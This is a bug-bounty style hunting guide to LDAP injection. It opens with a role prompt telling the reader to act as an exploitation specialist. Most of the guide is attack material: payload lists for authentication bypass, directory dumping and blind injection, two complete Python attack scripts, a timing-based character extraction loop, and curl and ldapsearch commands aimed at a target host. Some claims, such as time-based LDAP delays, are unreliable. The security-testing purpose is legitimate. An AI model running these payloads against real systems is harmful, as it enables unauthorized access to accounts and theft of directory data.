# LDAP Injection - Complete Hunting Guide

## Expert Role Definition and Mission Statement

You are an LDAP injection specialist with deep expertise in exploiting Lightweight Directory Access Protocol vulnerabilities. Your mission is to identify, exploit, and prevent LDAP injection attacks that allow attackers to bypass authentication, extract sensitive data, and manipulate directory services. You understand the intricate details of LDAP query syntax, filter construction, and the subtle vulnerabilities that arise from improper input handling. You possess mastery over tools like ldapsearch, custom LDAP exploitation scripts, and automated testing frameworks. Your goal is to chain LDAP injection with other attack vectors to achieve maximum impact, from authentication bypass to full directory compromise. You approach every target with methodical precision, analyzing LDAP queries, testing injection points, and documenting all findings with reproducible proof of concepts.

## Core Concepts Deep Dive

### LDAP Fundamentals

LDAP (Lightweight Directory Access Protocol) is a protocol for accessing and maintaining distributed directory information services. It's commonly used for authentication, user management, and resource lookup.

**LDAP Structure:**
```
dc=example,dc=com                    # Domain Component
ou=users,dc=example,dc=com          # Organizational Unit
cn=john,ou=users,dc=example,dc=com  # Common Name (User)
```

**LDAP Query Syntax:**
```
# Simple authentication
(cn=john)
(userPrincipalName=john@example.com)

# Wildcard search
(cn=john*)
(objectClass=user)

# Boolean operators
(&(cn=john)(objectClass=user))
(|(cn=john)(cn=jane))

# Negation
(!(cn=admin))

# Approximate match
(cn~=john)

# Greater/Less than
(uSNChanged>=12345)
```

### LDAP Filter Construction

**Authentication Filter:**
```
# Typical login filter
(&(uid={username})(userPassword={password}))

# With role check
(&(uid={username})(userPassword={password})(memberOf=cn=admins,ou=groups,dc=example,dc=com))
```

**Search Filter:**
```
# User search
(&(objectClass=user)(cn=*{search}*))

# Email search
(&(objectClass=user)(mail={email}))

# Phone search
(&(objectClass=user)(telephoneNumber={phone}))
```

### LDAP Injection Vulnerabilities

**Authentication Bypass:**
```
# Original filter
(&(uid={username})(userPassword={password}))

# Injected username
admin)(uid=*))(|(uid=*

# Resulting filter
(&(uid=admin)(uid=*))(|(uid=*)(userPassword={password}))

# This always returns true, bypassing authentication
```

**Data Extraction:**
```
# Original filter
(&(uid={username})(userPassword={password}))

# Injected username
*)(objectClass=*))(|(uid=*

# Resulting filter
(&(uid=*)(objectClass=*))(|(uid=*)(userPassword={password}))

# Returns all users in the directory
```

**Blind LDAP Injection:**
```
# Time-based detection
admin)(|(cn=*)))(|(cn=*   # Normal query
admin)(|(cn=*)))(|(cn=*))  # Injected query

# If response time differs, injection is possible
```

### LDAP Server Variations

| Server | Default Port | Syntax Variations |
|--------|--------------|-------------------|
| OpenLDAP | 389/636 | Standard LDAP |
| Active Directory | 389/636 | AD-specific attributes |
| Apache DS | 389/636 | Standard LDAP |
| Oracle Directory | 389/636 | Standard LDAP |
| IBM Tivoli | 389/636 | Standard LDAP |

## Pre-requisite Knowledge

- Understanding of LDAP protocol and directory services
- Knowledge of authentication mechanisms
- Familiarity with directory information trees (DIT)
- Understanding of LDAP filters and attributes
- Knowledge of web application architecture
- Familiarity with Active Directory (if applicable)
- Understanding of encoding techniques

## Step-by-Step Hunting Methodology

### Phase 1: LDAP Discovery

**Step 1: Identify LDAP Usage**
```bash
# Check for LDAP indicators
curl -I https://target.com | grep -i "ldap"
curl -I https://target.com | grep -i "directory"

# Check login pages
curl https://target.com/login
# Look for username/password fields

# Check for LDAP-specific errors
curl "https://target.com/login" -d "username=admin&password=wrong"
# Error: "Invalid credentials" or "LDAP error"
```

**Step 2: Map LDAP Endpoints**
```
Look for:
- Login forms
- User search functionality
- Password reset pages
- User profile pages
- Administration panels
- API endpoints with user parameters
```

**Step 3: Test for Injection**
```bash
# Basic injection test
curl "https://target.com/login" -d "username=admin)&password=wrong"

# Wildcard test
curl "https://target.com/login" -d "username=admin*&password=wrong"

# Boolean test
curl "https://target.com/login" -d "username=admin)(uid=*))(|(uid=*&password=wrong"
```

### Phase 2: LDAP Injection Testing

**Test 1: Authentication Bypass**
```bash
# Original request
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=wrongpassword

# Injection attempt
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin)(uid=*))(|(uid=*&password=wrongpassword

# If login succeeds, injection works
```

**Test 2: Data Extraction**
```bash
# Original request
POST /search HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=john

# Injection attempt
POST /search HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=*)(objectClass=*))(|(uid=*

# If all users are returned, injection works
```

**Test 3: Blind LDAP Injection**
```bash
# Time-based detection
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin)(|(cn=*)))(|(cn=*   # Normal query
# Measure response time

username=admin)(|(cn=*)))(|(cn=*))  # Injected query
# Measure response time

# If response time differs, injection is possible
```

### Phase 3: Exploitation Chain

```
1. Identify LDAP endpoints
2. Test for injection vulnerabilities
3. Extract user information
4. Bypass authentication
5. Escalate privileges
6. Document all findings
```

## Tool Arsenal with Exact Commands

### ldapsearch (OpenLDAP)

```bash
# Basic search
ldapsearch -H ldap://target.com -x -b "dc=example,dc=com" "(cn=*)"

# With authentication
ldapsearch -H ldap://target.com -x -D "cn=admin,dc=example,dc=com" -W -b "dc=example,dc=com"

# Anonymous bind
ldapsearch -H ldap://target.com -x -b "dc=example,dc=com" "(objectClass=*)"

# SSL connection
ldapsearch -H ldaps://target.com -x -b "dc=example,dc=com"
```

### Custom LDAP Injection Script

```python
#!/usr/bin/env python3
import requests
import sys
import time
from urllib.parse import urlencode

class LDAPInjector:
    def __init__(self, target_url, login_endpoint):
        self.target_url = target_url
        self.login_endpoint = login_endpoint
        self.session = requests.Session()
    
    def test_basic_injection(self, username, password):
        """Test basic LDAP injection"""
        # Original request
        original_data = {
            'username': username,
            'password': password
        }
        
        # Injection payloads
        payloads = [
            f"{username})",
            f"{username}*)",
            f"{username}*)|(|(cn=*)",
            f"{username}*)(uid=*))(|(uid=*",
            f"{username}*)(objectClass=*))(|(uid=*",
            f"{username}*)(|(cn=*)))(|(cn=*",
            f"{username}*)(|(uid=*)))(|(uid=*"
        ]
        
        results = []
        for payload in payloads:
            data = {
                'username': payload,
                'password': password
            }
            
            response = self.session.post(
                f"{self.target_url}{self.login_endpoint}",
                data=data,
                allow_redirects=False
            )
            
            result = {
                'payload': payload,
                'status_code': response.status_code,
                'response_length': len(response.text),
                'login_success': 'dashboard' in response.text or response.status_code == 302
            }
            
            results.append(result)
        
        return results
    
    def test_blind_injection(self, username, password):
        """Test blind LDAP injection"""
        # Normal query
        normal_data = {
            'username': username,
            'password': password
        }
        
        # Injection query
        injection_data = {
            'username': f"{username}*)(|(cn=*)))(|(cn=*",
            'password': password
        }
        
        # Measure response times
        start_time = time.time()
        normal_response = self.session.post(
            f"{self.target_url}{self.login_endpoint}",
            data=normal_data
        )
        normal_time = time.time() - start_time
        
        start_time = time.time()
        injection_response = self.session.post(
            f"{self.target_url}{self.login_endpoint}",
            data=injection_data
        )
        injection_time = time.time() - start_time
        
        result = {
            'normal_time': normal_time,
            'injection_time': injection_time,
            'time_difference': abs(normal_time - injection_time),
            'vulnerable': abs(normal_time - injection_time) > 0.5
        }
        
        return result
    
    def extract_user_data(self, username, password):
        """Extract user data via LDAP injection"""
        # Injection to get all users
        injection_data = {
            'username': f"{username}*)(objectClass=*))(|(uid=*",
            'password': password
        }
        
        response = self.session.post(
            f"{self.target_url}{self.login_endpoint}",
            data=injection_data
        )
        
        # Parse response for user data
        # This is highly application-specific
        result = {
            'response': response.text,
            'status_code': response.status_code,
            'contains_user_data': 'user' in response.text.lower() or 'admin' in response.text.lower()
        }
        
        return result
    
    def bypass_authentication(self, target_username):
        """Bypass authentication for specific user"""
        # Injection to bypass authentication
        injection_data = {
            'username': f"{target_username}*)(uid=*))(|(uid=*",
            'password': 'anypassword'
        }
        
        response = self.session.post(
            f"{self.target_url}{self.login_endpoint}",
            data=injection_data,
            allow_redirects=False
        )
        
        result = {
            'target_user': target_username,
            'status_code': response.status_code,
            'login_success': 'dashboard' in response.text or response.status_code == 302,
            'response_length': len(response.text)
        }
        
        return result
    
    def full_scan(self):
        """Perform full LDAP injection scan"""
        print(f"[*] Scanning: {self.target_url}{self.login_endpoint}")
        
        # Test basic injection
        print(f"\n[*] Testing basic injection...")
        basic_results = self.test_basic_injection('admin', 'wrongpassword')
        for result in basic_results:
            print(f"  {result['payload']}: {result}")
        
        # Test blind injection
        print(f"\n[*] Testing blind injection...")
        blind_result = self.test_blind_injection('admin', 'wrongpassword')
        print(f"  Blind injection: {blind_result}")
        
        # Test authentication bypass
        print(f"\n[*] Testing authentication bypass...")
        bypass_result = self.bypass_authentication('admin')
        print(f"  Auth bypass: {bypass_result}")
        
        # Extract user data
        print(f"\n[*] Extracting user data...")
        data_result = self.extract_user_data('admin', 'wrongpassword')
        print(f"  Data extraction: {data_result}")
        
        return {
            'basic': basic_results,
            'blind': blind_result,
            'bypass': bypass_result,
            'data': data_result
        }

# Usage
injector = LDAPInjector("https://target.com", "/login")
results = injector.full_scan()
```

### Burp Suite Extension

```
# LDAP Injection Extension
- Install from BApp Store
- Automatically tests LDAP injection
- Identifies injection points
- Tests for bypass techniques
```

### Custom LDAP Payloads

```python
#!/usr/bin/env python3
import requests
import sys

LDAP_PAYLOADS = {
    'auth_bypass': [
        'admin)',
        'admin*)',
        'admin*)|(|(cn=*)',
        'admin*)(uid=*))(|(uid=*',
        'admin*)(objectClass=*))(|(uid=*',
        'admin*)(|(cn=*)))(|(cn=*',
        'admin*)(|(uid=*)))(|(uid=*'
    ],
    'data_extraction': [
        '*)(objectClass=*))(|(uid=*',
        '*)(&(|(objectClass=*)',
        '*)(cn=*))(|(cn=*',
        '*)(mail=*))(|(mail=*',
        '*)(memberOf=*))(|(memberOf=*'
    ],
    'blind_injection': [
        'admin)(|(cn=*)))(|(cn=*',
        'admin)(|(uid=*)))(|(uid=*',
        'admin)(|(objectClass=*)))(|(objectClass=*'
    ]
}

def test_ldap_injection(url, endpoint, username, password):
    """Test LDAP injection"""
    results = []
    
    for injection_type, payloads in LDAP_PAYLOADS.items():
        print(f"\n[*] Testing {injection_type}...")
        
        for payload in payloads:
            data = {
                'username': payload,
                'password': password
            }
            
            response = requests.post(
                f"{url}{endpoint}",
                data=data,
                allow_redirects=False
            )
            
            result = {
                'injection_type': injection_type,
                'payload': payload,
                'status_code': response.status_code,
                'response_length': len(response.text),
                'login_success': 'dashboard' in response.text or response.status_code == 302
            }
            
            results.append(result)
            
            if result['login_success']:
                print(f"  [+] Bypass successful: {payload}")
    
    return results

if __name__ == "__main__":
    url = sys.argv[1]
    endpoint = sys.argv[2]
    username = sys.argv[3]
    password = sys.argv[4]
    
    results = test_ldap_injection(url, endpoint, username, password)
    
    print(f"\n[*] Results:")
    for result in results:
        if result['login_success']:
            print(f"  [+] {result['injection_type']}: {result['payload']}")
```

## Real-World Case Studies

### Case Study 1: Authentication Bypass via LDAP Injection

**Scenario:** A web application uses LDAP for authentication and is vulnerable to injection.

**Discovery:**
```bash
# Step 1: Analyze login request
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=wrongpassword

# Response: Invalid credentials

# Step 2: Test LDAP injection
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin)(uid=*))(|(uid=*&password=wrongpassword

# Response: Login successful
```

**Exploitation:**
```python
# Step 1: Bypass authentication
import requests

target = "https://target.com/login"

# Injection payload
payload = {
    'username': 'admin*)(uid=*))(|(uid=*',
    'password': 'anypassword'
}

response = requests.post(target, data=payload)
if 'dashboard' in response.text:
    print("[+] Authentication bypass successful")
```

### Case Study 2: User Data Extraction via LDAP Injection

**Scenario:** A web application has LDAP injection in user search functionality.

**Discovery:**
```bash
# Step 1: Analyze search request
POST /search HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=john

# Response: User not found

# Step 2: Test data extraction
POST /search HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=*)(objectClass=*))(|(uid=*

# Response: All users returned
```

**Exploitation:**
```python
# Step 1: Extract all users
import requests

target = "https://target.com/search"

# Injection payload
payload = {
    'username': '*)(objectClass=*))(|(uid=*'
}

response = requests.post(target, data=payload)

# Parse response for user data
# Application-specific parsing
users = parse_user_data(response.text)
print(f"[+] Extracted {len(users)} users")
```

### Case Study 3: Blind LDAP Injection

**Scenario:** A web application has blind LDAP injection with time-based detection.

**Discovery:**
```bash
# Step 1: Normal query
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=wrongpassword
# Response time: 100ms

# Step 2: Injection query
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin)(|(cn=*)))(|(cn=*}&password=wrongpassword
# Response time: 2000ms

# Time difference indicates injection
```

**Exploitation:**
```python
# Step 1: Extract data via timing
import requests
import time

target = "https://target.com/login"

# Function to measure response time
def measure_time(username):
    start = time.time()
    requests.post(target, data={'username': username, 'password': 'wrong'})
    return time.time() - start

# Extract username character by character
username = ""
charset = "abcdefghijklmnopqrstuvwxyz0123456789"

for i in range(20):
    for char in charset:
        payload = f"admin)(|(cn={username}{char}*)))(|(cn=*"
        if measure_time(payload) > 1.5:
            username += char
            print(f"[*] Found: {username}")
            break

print(f"[+] Username: {username}")
```

### Case Study 4: Active Directory LDAP Injection

**Scenario:** A web application uses Active Directory for authentication.

**Discovery:**
```bash
# Step 1: Analyze AD login
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=DOMAIN\admin&password=wrongpassword

# Step 2: Test AD-specific injection
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=DOMAIN\admin)(uid=*))(|(uid=*&password=wrongpassword

# Response: Login successful
```

**Exploitation:**
```python
# Step 1: Bypass AD authentication
import requests

target = "https://target.com/login"

# AD-specific injection
payload = {
    'username': 'DOMAIN\\admin)(uid=*))(|(uid=*',
    'password': 'anypassword'
}

response = requests.post(target, data=payload)
if 'dashboard' in response.text:
    print("[+] AD authentication bypass successful")
```

## Advanced Techniques and Bypass

### Encoding Bypass

**URL Encoding:**
```bash
# Double URL encoding
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin%29%28uid%3D%2A%29%29%28%7C%28uid%3D%2A&password=wrong

# Unicode encoding
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin%EF%BC%89%EF%BC%88uid%3D%EF%BC%8A%EF%BC%89%EF%BC%89%EF%BC%88%7C%EF%BC%88uid%3D%EF%BC%8A&password=wrong
```

### Filter Manipulation

**Complex Filters:**
```bash
# Original filter
(&(uid={username})(userPassword={password}))

# Injected filter
(&(uid=admin)(uid=*))(|(uid=*)(userPassword={password}))

# This bypasses the password check
```

**Nested Filters:**
```bash
# Nested injection
username=admin)(|(cn=*)))(|(cn=*
# Creates nested filter that always returns true
```

### Attribute Injection

**Attribute-Based Injection:**
```bash
# Inject via different attributes
username=*)(memberOf=cn=admins,ou=groups,dc=example,dc=com))(|(uid=*
# Checks for group membership

username=*)(userAccountControl:1.2.840.113556.1.4.803:=2))(|(uid=*
# Checks for disabled accounts
```

### Time-Based Blind Injection

**Timing Attacks:**
```bash
# Use time delays
username=admin)(|(cn=*)))(|(cn=*
# Normal response time

username=admin)(|(cn=*)))(|(cn=*))(|(cn=*))
# With time delay if injection works
```

## Detection and Indicators

### Error Messages

```
# Common LDAP error messages
"Invalid credentials"
"LDAP error"
"Directory service error"
"Authentication failed"
"User not found"
"Bind failed"
```

### Log Indicators

```
[LDAP] Injection attempt detected
[LDAP] Invalid filter syntax
[LDAP] Authentication bypass attempt
[LDAP] Data extraction attempt
```

### Response Analysis

```bash
# Check for different responses
# Normal login failure
curl -X POST "https://target.com/login" -d "username=admin&password=wrong"
# Response: "Invalid credentials" (short response)

# Injection attempt
curl -X POST "https://target.com/login" -d "username=admin)(uid=*))(|(uid=*&password=wrong"
# Response: "Login successful" (longer response)
```

## Impact Assessment

| Impact Level | Description | Example |
|-------------|-------------|---------|
| Critical | Full authentication bypass | Any user login without password |
| High | User data extraction | Extract all user information |
| High | Privilege escalation | Admin access without credentials |
| Medium | Information disclosure | Directory structure exposure |
| Low | Denial of service | Malformed queries crash service |

## Common Pitfalls

1. **Not testing all input fields** - LDAP injection can occur anywhere
2. **Ignoring different LDAP servers** - OpenLDAP, AD, etc.
3. **Overlooking encoding** - URL, Unicode, HTML
4. **Not testing with authentication** - Authenticated injection
5. **Forgetting about blind injection** - Time-based detection
6. **Ignoring error messages** - Error-based extraction
7. **Not considering case sensitivity** - Attribute names
8. **Forgetting about special characters** - Parentheses, asterisks
9. **Not testing complex filters** - Nested filter injection
10. **Ignoring framework behavior** - Different frameworks handle differently

## Integration with Other Hunting Areas

- **Authentication Bypass**: LDAP injection for auth bypass
- **Information Disclosure**: Extract user data
- **Privilege Escalation**: Admin access without credentials
- **XSS**: LDAP injection + XSS for data exfiltration
- **SQL Injection**: LDAP injection + SQLi for database access
- **Active Directory**: AD-specific LDAP attacks
- **Directory Services**: Full directory compromise

## Reporting Template

```
## Vulnerability: LDAP Injection

### Summary
[One sentence description]

### Affected Endpoint
- URL: [full URL]
- Parameter: [affected parameter]
- Method: [GET/POST]

### Vulnerability Details
- Type: [Auth bypass/Data extraction/Blind injection]
- LDAP Server: [OpenLDAP/Active Directory/etc]
- Filter: [original filter]

### Proof of Concept
[Step-by-step reproduction]

### Impact
[Detailed impact analysis]

### Remediation
- Use parameterized queries
- Validate and sanitize input
- Implement proper error handling
- Use least privilege for LDAP binds
- Enable LDAP logging

### References
- CWE-90: Improper Neutralization of Special Elements used in an LDAP Query
- OWASP: LDAP Injection
```

## Practice Labs

### LDAP Injection Labs

**OWASP WebGoat:**
```bash
git clone https://github.com/WebGoat/WebGoat
# LDAP injection module
```

**DVWS (Damn Vulnerable Web Server):**
```bash
git clone https://github.com/pschlink/DVWS
# LDAP injection challenges
```

**HackTheBox LDAP Challenges:**
- Various LDAP exploitation scenarios
- Real-world difficulty

### Practice Commands

```bash
# Basic LDAP search
ldapsearch -H ldap://target.com -x -b "dc=example,dc=com" "(cn=*)"

# With authentication
ldapsearch -H ldap://target.com -x -D "cn=admin,dc=example,dc=com" -W -b "dc=example,dc=com"

# Test injection
curl -X POST "https://target.com/login" -d "username=admin)(uid=*))(|(uid=*&password=wrong"

# Extract users
curl -X POST "https://target.com/search" -d "username=*)(objectClass=*))(|(uid=*"
```

## Ethical Guidelines

1. **Only test systems you have permission to test**
2. **Do not exfiltrate data without authorization**
3. **Report all findings to the system owner**
4. **Do not cause damage to systems**
5. **Use test accounts for testing when possible**
6. **Document all actions for audit purposes**
7. **Follow responsible disclosure practices**
8. **Do not share exploits publicly**
9. **Comply with all applicable laws and regulations**
10. **Leave systems in the state you found them**

## Quick Reference Cheat Sheet

### LDAP Injection Testing Checklist

```
[ ] Identify LDAP endpoints
[ ] Test for injection vulnerabilities
[ ] Test authentication bypass
[ ] Test data extraction
[ ] Test blind injection
[ ] Test encoding bypass
[ ] Chain with other attacks
[ ] Document all findings
```

### Common LDAP Payloads

**Auth Bypass:**
```
admin)
admin*)|(|(cn=*)
admin*)(uid=*))(|(uid=*
admin*)(objectClass=*))(|(uid=*
```

**Data Extraction:**
```
*)(objectClass=*))(|(uid=*
*)(cn=*))(|(cn=*
*)(mail=*))(|(mail=*
*)(memberOf=*))(|(memberOf=*
```

**Blind Injection:**
```
admin)(|(cn=*)))(|(cn=*
admin)(|(uid=*)))(|(uid=*
admin)(|(objectClass=*)))(|(objectClass=*
```

### Quick Commands

```bash
# Test injection
curl -X POST "https://target.com/login" -d "username=admin)(uid=*))(|(uid=*&password=wrong"

# Extract users
curl -X POST "https://target.com/search" -d "username=*)(objectClass=*))(|(uid=*"

# LDAP search
ldapsearch -H ldap://target.com -x -b "dc=example,dc=com" "(cn=*)"

# LDAP search with auth
ldapsearch -H ldap://target.com -x -D "cn=admin,dc=example,dc=com" -W -b "dc=example,dc=com"
```

### LDAP Filter Reference

```
# Equality
(cn=admin)

# Wildcard
(cn=admin*)

# Boolean AND
(&(cn=admin)(objectClass=user))

# Boolean OR
(|(cn=admin)(cn=operator))

# Negation
(!(cn=admin))

# Approximate
(cn~=admin)

# Greater/Less than
(uSNChanged>=12345)
```
